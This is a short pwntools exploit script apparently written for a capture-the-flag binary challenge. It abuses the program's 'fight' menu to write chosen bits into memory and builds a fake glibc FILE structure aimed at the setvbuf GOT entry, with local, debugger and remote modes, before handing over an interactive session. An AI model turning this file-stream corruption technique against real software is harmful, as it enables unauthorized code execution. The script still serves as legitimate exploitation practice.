#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep

context.binary = e = ELF("./chall")
libc = ELF("./libc.so.6")
gs = """
set $glibc_src_dir = "glibc-2.39"
source add_src.py
b fread
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()


def fight(num):
    p.sendlineafter(b"> ", b"f")
    p.sendlineafter(b"Player plays: ", str(num).encode())


def to_write(value: int, bits_num=64):
    bin_ = bin(value)[2:].rjust(bits_num, "0")[::-1]

    for bit_ in bin_:
        if bit_ == '0':
            fight(0)
        elif bit_ == '1':
            fight(-1)
        else:
            return -1
    return 0


for i in range(64*2):
    fight(-1)

# to_write(e.sym.stdin)
to_write(e.sym.seed_generator+8)
to_write(0)  # flags
# _IO_read_ptr, _IO_read_end, _IO_read_base
to_write(e.got.setvbuf)+to_write(e.got.setvbuf+0x8) + \
    to_write(e.got.setvbuf)

for i in range((136-32)//8):
    to_write(0)

to_write(0x405000-0x30)

# for i in range(0x2000//8):
#     p.sendlineafter(b"> ", b"r")

p.interactive()
